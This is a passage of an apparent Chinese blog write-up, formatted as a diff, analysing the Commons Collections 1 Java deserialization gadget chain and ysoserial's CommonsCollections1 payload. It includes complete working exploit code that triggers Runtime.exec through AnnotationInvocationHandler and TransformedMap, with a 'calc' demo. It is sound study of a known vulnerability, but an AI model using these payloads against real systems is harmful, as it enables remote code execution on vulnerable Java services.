+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/14.png" class="">
+<h3 id="父类setValue方法——调用checkSetValue">父类setValue方法——调用checkSetValue</h3>
+<p>父类有个方法setValue调用了checkSetValue</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/15.png" class="">
+<p>因此获取Map的映射关系，即获取entrySet里面的entry，就能对其调用setValue方法</p>
+<h2 id="命令执行测试">命令执行测试</h2>
+<h3 id="ChainedTransformer利用反射触发命令执行">ChainedTransformer利用反射触发命令执行</h3>
+<p><strong>我们在利用InvokerTransformer的时候不可能直接传入一个Runtime实例</strong>，换个思路如果利用ChainedTransformer传入Runtime类，<strong>利用反射，然后调用exec方法</strong>了，过程只需要定义一个Transformer数组、然后调用ChainedTransformer的transform方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;ct, it1, it2, it3&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/16.png" class="">
+<p>调用流程是：传入Runtime.class-&gt;&gt;反射调用getRuntime方法获取实例-&gt;&gt;调用exec完成RCE</p>
+<p><strong>ConstantTransformer用以获取Runtime.class，因此最开始，调用ChainedTransformer的transform方法可以随便传参数</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/17.png" class="">
+<h3 id="ChainedTransformer-put触发命令执行">ChainedTransformer+put触发命令执行</h3>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Manual</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;ct, it1, it2, it3&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformermap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        transformermap.put(<span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>新建一个最普通的Map，用HashMap，然后给他一个初值，<strong>如果不给初值后面调decorate修饰生成TransformedMap是无法进行的，因为decorate继承的super方法</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/18.png" class="">
+<p>追一下父类，有判空的操作</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/19.png" class="">
+<p>对修饰过的Map，执行put触发transform方法</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/20.png" class="">
+<h3 id="ChainedTransformer-entrySet-父类setValue触发命令执行">ChainedTransformer+entrySet+父类setValue触发命令执行</h3>
+<p>遍历Map元素，调用setValue方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Manual</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;ct, it1, it2, it3&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformermap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object obj : transformermap.entrySet())&#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">            entry.setValue(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="AnnotationInvocationHandler类">AnnotationInvocationHandler类</h2>
+<p>触发transform的问题也解决了，那么就差序列化操作了，如何与TransformedMap相结合并且调用readObject？</p>
+<p>有一类AnnotationInvocationHandler在sun.reflect.annotation，支持反序列化，可以看到它的构造函数正好可以传入一个Map对象，也就是可以传入TransformedMap</p>
+<p><strong>同时注意到这个类只能通过反射实例化</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/21.png" class="">
+<p><strong>并且它重写了readObject，且调用了setValue！</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/22.png" class="">
+<p>现在就要想办法构造调用了</p>
+<h3 id="readObject方法——调用TransformedMap-setValue">readObject方法——调用TransformedMap.setValue</h3>
+<p>var5来自memberValues</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/23.png" class="">
+<p>查看构造函数，memberValues来自传入的Map，因此可以在此传入TransformedMap</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/24.png" class="">
+<p>然后调用setValue需要保证var7非空，var7来自<code>var3.get(var6)</code></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/25.png" class="">
+<p>这里的var6是我们传入Map的第一个键值对的键，<strong>因此这里var7的来源是从var3这个map查找是否存在键var6</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/26.png" class="">而var3又与this.type有关系，var3获取了var2的注解
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/27.png" class="">
+<p>this.type来自我们传入的类，<strong>这个类是我们传入的注解</strong></p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/28.png" class="">**因此要传入一个注解类，并且这个注解类里面的注解方法名也就是接口名是初始化Map的第一个键名**，恰好有一名叫java.lang.annotation.Target的类，其注解方法名叫value
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/29.png" class="">
+<p>因此第一个参数，只要传入java.lang.annotation.Target类即可，到这里就构造完毕了</p>
+<h2 id="代码">代码</h2>
+<h3 id="POP链-4">POP链</h3>
+<p>根据上面的分析：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject();</span><br><span class="line">AnnotationInvocationHandler.readObject();</span><br><span class="line">TransformedMap.entrySet().iterator().next().setValue();</span><br><span class="line">TransformedMap.checkSetValue();</span><br><span class="line">TransformedMap.transform();</span><br><span class="line">ChainedTransformer.transform();</span><br><span class="line">	ConstantTransformer.transform();</span><br><span class="line">	InvokerTransformer.transform();</span><br><span class="line">		Method.invoke();</span><br><span class="line">		Class.getMethod();</span><br><span class="line">	InvokerTransformer.transform();</span><br><span class="line">		Method.invoke();</span><br><span class="line">		Runtime.getRuntime();</span><br><span class="line">	InvokerTransformer.transform();</span><br><span class="line">		Method.invoke(;</span><br><span class="line">		Runtime.exec();</span><br></pre></td></tr></table></figure>
+<h3 id="payload">payload</h3>
+<p>根据上面的流程，首先实例化ChainedTransformer执行命令，然后再实例化一个Map，decorate修饰，然后用反射实例化AnnotationInvocationHandle</p>
+<p><strong>JDK&lt;1.8</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Manual</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">it3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;ct, it1, it2, it3&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformermap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformermap);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;temp&quot;</span>, <span class="string">&quot;out&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">        f.deleteOnExit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="ysoserial-CommonsCollections1-payload分析">ysoserial CommonsCollections1 payload分析</h2>
+<blockquote>
+<p>以下为初步分析，原谅笔者还未精通动态代理详细分析可以查看另一博主的文章：<br>
+<a href="https://blog.csdn.net/qq_35733751/article/details/118462281">7-java安全——java反序列化CC1链分析</a></p>
+</blockquote>
+<p>思路都差不多，只是触发ChainedTransformer.transform的方法不同</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;InvocationHandler&gt; &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">					<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">					<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">					<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Map-mapProxy-Gadgets-createMemoitizedProxy-lazyMap-Map-class">Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class)</h3>
+<p>这里调createMemoitizedProxy生成mapProxy代理对象</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/30.png" class="">
+<p>追一下</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/31.png" class="">
+<p>这里利用的是动态代理机制，传入lazyMap和Map.class，然后map又传入createMemoizedInvocationHandler生成了AnnotationInvocationHandler实例；</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/32.png" class="">然后就到了createProxy
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/33.png" class="">第一个参数指定被代理类的加载器、第二个参数指定要被代理的类接口，这里为空、第三个参数指定InvocationHandler，之后会调用InvocationHandler的invoke方法，这里传入了AnnotationHandler实例。那么就要追一下AnnotationHandler的invoke方法。
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/34.png" class="">
+<p>这里就回到了AnnotationInvocationHandler的构造器</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/35.png" class="">
+<p><strong>因此这步会调用了lazyMap的get方法</strong>，然后触发transform</p>
+<img src="/2022/06/21/Commons-Collections/Commons-Collections1%E4%B8%8Eysoserial%E5%88%86%E6%9E%90/36.png" class="">
+<h3 id="InvocationHandler-handler-Gadgets-createMemoizedInvocationHandler-mapProxy">InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</h3>
+<p>第二次调用createMemoizedInvocationHandler生成handler代理对象，将mapProxy对象赋给AnnotationInvocationHandler的memberValues属性。</p>
+<p>两次代理的结果如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">handler.memberValues == mapProxy</span><br><span class="line">mapProxy.handler.memberValues == lazyMap</span><br></pre></td></tr></table></figure>
+<h3 id="反序列化">反序列化</h3>
+<p>执行entrySet()动态代理会调用AnnotationInvocationHandler的invoke方法，由于其调用的不是toString，hashCode等方法，就会执行Object var6 = this.memberValues.get(var4)，从而完成攻击链条，导致代码执行。然后就调用lazyMap的get()方法。</p>
